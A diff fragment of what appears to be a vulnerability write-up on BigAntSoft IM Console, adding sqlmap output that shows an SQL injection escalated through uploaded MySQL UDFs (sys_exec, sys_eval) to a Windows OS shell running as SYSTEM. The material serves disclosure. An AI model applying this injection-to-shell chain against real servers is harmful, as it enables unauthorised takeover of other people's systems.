@@ -145,6 +145,41 @@ r\AppData\Local\sqlmap\output\10.3.9.215'
 
 </code></pre>
 <p>Through the SQL injection vulnerability, it is found that the current user has database administrator rights (root@localhost), and finally remote command execution can be achieved:</p>
+<pre class="notranslate"><code class="notranslate">[17:26:46] [INFO] testing if current user is DBA
+[17:26:46] [INFO] fetching current user
+[17:26:46] [INFO] resumed: 'root@localhost'
+what is the back-end database management system architecture?
+[1] 32-bit (default)
+[2] 64-bit
+&gt; 2
+[17:26:50] [INFO] checking if UDF 'sys_exec' already exist
+[17:26:51] [INFO] retrieved: '0'
+[17:26:51] [INFO] checking if UDF 'sys_eval' already exist
+[17:26:51] [INFO] retrieved: '0'
+[17:26:51] [INFO] detecting back-end DBMS version from its banner
+[17:26:51] [INFO] resumed: '10.4.12-MariaDB'
+[17:26:51] [INFO] retrieving MySQL plugin directory absolute path
+[17:26:51] [INFO] resumed: 'C:\\Program Files (x86)\\BigAntSoft\\IM Console\\...
+
+[17:27:09] [WARNING] time-based comparison requires larger statistical model, pl
+ease wait............................ (done)
+[17:27:15] [INFO] retrieved: '7168'
+[17:27:15] [INFO] the local file 'C:\Users\ADMINI~1\AppData\Local\Temp\1\sqlmaph
+c_gnw3n14364\lib_mysqludf_syssq_587xx.dll' and the remote file 'C:/Program Files
+ (x86)/BigAntSoft/IM Console/im_dbserver/lib/plugin/libsappi.dll' have the same
+size (7168 B)
+[17:27:15] [INFO] creating UDF 'sys_exec' from the binary UDF file
+[17:27:16] [INFO] creating UDF 'sys_eval' from the binary UDF file
+[17:27:17] [INFO] going to use injected user-defined functions 'sys_eval' and 's
+ys_exec' for operating system command execution
+[17:27:17] [INFO] calling Windows OS shell. To quit type 'x' or 'q' and press EN
+TER
+os-shell&gt; whoami
+do you want to retrieve the command standard output? [Y/n/a]
+
+[17:27:24] [INFO] retrieved: 'nt authority\\system'
+command standard output: 'nt authority\system'
+</code></pre>
 </div>
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
 <div class="comments" id="comments"></div>
